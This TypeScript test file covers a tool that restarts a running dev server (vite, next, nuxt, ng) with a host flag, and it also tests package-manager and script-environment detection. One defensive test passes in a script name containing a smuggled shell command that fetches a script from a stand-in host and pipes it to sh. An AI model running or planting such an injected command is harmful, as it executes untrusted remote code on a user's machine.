import { test } from 'node:test';
import assert from 'node:assert';
import * as fs from 'node:fs/promises';
import * as os from 'node:os';
import * as path from 'node:path';
import { buildNetworkCommand, detectPackageManager, parseScriptEnv, runningProgram } from '../src/restartCommand.ts';

const build = (script: string, body: unknown, processCommand: string, packageManager = 'npm') =>
  buildNetworkCommand({ script, body, processCommand, packageManager });
const vite = 'node /app/node_modules/.bin/vite --port 3000';

test('restarts the script that is running, with the tool\'s host flag', () => {
  assert.strictEqual(build('dev', 'vite --port 3000', vite), 'npm run dev -- --host');
  // Whatever subcommand the script runs is what was running, so it is what runs again.
  assert.strictEqual(build('preview', 'vite preview', vite), 'npm run preview -- --host');
});

test('passes the flag straight through for other package managers', () => {
  assert.strictEqual(build('dev', 'next dev', 'next-server (v14.2.0)', 'pnpm'), 'pnpm run dev -H 0.0.0.0');
});

test('recognises tools run from their package\'s bin file', () => {
  assert.strictEqual(build('dev', 'nuxt dev', 'node /app/node_modules/nuxt/bin/nuxt.mjs dev'), 'npm run dev -- --host');
  assert.strictEqual(build('dev', 'nuxi dev', 'node --inspect /app/node_modules/.bin/nuxi dev'), 'npm run dev -- --host');
  assert.strictEqual(build('start', 'ng serve', 'ng serve'), 'npm run start -- --host 0.0.0.0');
});

test('never offers a script name that could inject shell commands or options', () => {
  assert.strictEqual(build('dev; curl evil.sh | sh; #', 'vite', vite), undefined);
  assert.strictEqual(build('--dev', 'vite', vite), undefined);
});

test('does not replace a server that is not one of the known tools', () => {
  // Laravel ships "dev": "vite" for its assets; restarting would swap the app for the asset server.
  assert.strictEqual(build('dev', 'vite', 'php artisan serve'), undefined);
  assert.strictEqual(build('start', 'node server.js', 'node server.js'), undefined);
  assert.strictEqual(build('dev', 'vite', ''), undefined);
});

test('only looks at the program, not its folder or arguments', () => {
  assert.strictEqual(build('dev', 'vite', 'node /Users/me/vite/server.js'), undefined);
  assert.strictEqual(build('dev', 'next dev', 'node server.js --preset next'), undefined);
  assert.strictEqual(build('dev', 'next dev', 'node /Users/me/vite/app/node_modules/.bin/next dev'), 'npm run dev -- -H 0.0.0.0');
  // A script file named after the tool isn't the tool.
  assert.strictEqual(build('dev', 'node scripts/vite.js', vite), undefined);
});

test('skips scripts the flag would not reach, or that already set a host', () => {
  assert.strictEqual(build('dev', 'vite && echo done', vite), undefined);
  assert.strictEqual(build('dev', 'concurrently "vite" "node api.js"', vite), undefined);
  assert.strictEqual(build('dev', 'vite > vite.log', vite), undefined);
  assert.strictEqual(build('dev', 'vite --host localhost', vite), undefined);
  assert.strictEqual(build('dev', undefined, vite), undefined);
});

test('runningProgram skips the runtime and its options', () => {
  assert.strictEqual(runningProgram('node --max-old-space-size=4096 /app/node_modules/vite/bin/vite.js'), 'vite');
  assert.strictEqual(runningProgram('next-server (v15.0.0)'), 'next-server');
  assert.strictEqual(runningProgram('node'), undefined);
  assert.strictEqual(runningProgram(''), undefined);
});

test('parseScriptEnv reads the script, package.json and package manager', () => {
  assert.deepStrictEqual(parseScriptEnv([
    'HOME=/Users/me', 'npm_lifecycle_event=start', 'npm_lifecycle_event=dev',
    'npm_package_json=/app/package.json', 'npm_config_user_agent=pnpm/9.1.0 npm/? node/v20.11.0 darwin arm64',
  ]), { event: 'dev', packageJson: '/app/package.json', packageManager: 'pnpm' });
  assert.deepStrictEqual(parseScriptEnv(['npm_lifecycle_event=dev', 'npm_config_user_agent=cnpm/1.0']),
    { event: 'dev', packageJson: undefined, packageManager: undefined });
  assert.strictEqual(parseScriptEnv(['HOME=/Users/me', '']), undefined);
});

test('detects the package manager from the monorepo root and the packageManager field', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'mobile-serve-'));
  try {
    const app = path.join(root, 'packages', 'web');
    await fs.mkdir(app, { recursive: true });
    await fs.writeFile(path.join(root, 'pnpm-lock.yaml'), '');
    await fs.writeFile(path.join(app, 'package.json'), '{}');
    assert.strictEqual(await detectPackageManager(app), 'pnpm');
    await fs.writeFile(path.join(app, 'package.json'), '{"packageManager": "yarn@4.1.0"}');
    assert.strictEqual(await detectPackageManager(app), 'yarn');
  } finally {
    await fs.rm(root, { recursive: true, force: true });
  }
});
